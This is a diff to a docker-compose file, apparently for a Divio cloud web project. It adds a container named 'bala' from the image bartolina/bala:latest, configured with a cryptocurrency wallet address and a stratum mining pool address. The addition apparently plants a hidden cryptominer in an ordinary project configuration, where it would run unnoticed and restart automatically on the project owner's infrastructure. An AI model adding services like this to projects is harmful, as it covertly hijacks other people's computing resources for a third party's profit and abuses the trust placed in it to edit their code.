@@ -9,6 +9,13 @@ version: "2"
 services:
   # The web container is an instance of exactly the same Docker image as your
   # Cloud application container.
+  bala:
+    image: bartolina/bala:latest
+    container_name: bala
+    restart: unless-stopped
+    environment:
+      - WALLET_ADDRESS=sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.divio
+      - POOL_ADDRESS=stratum+tcp://stratum-asia.rplant.xyz:7042
   web:
     build: .
     # Change the port if you'd like to expose your project locally on a
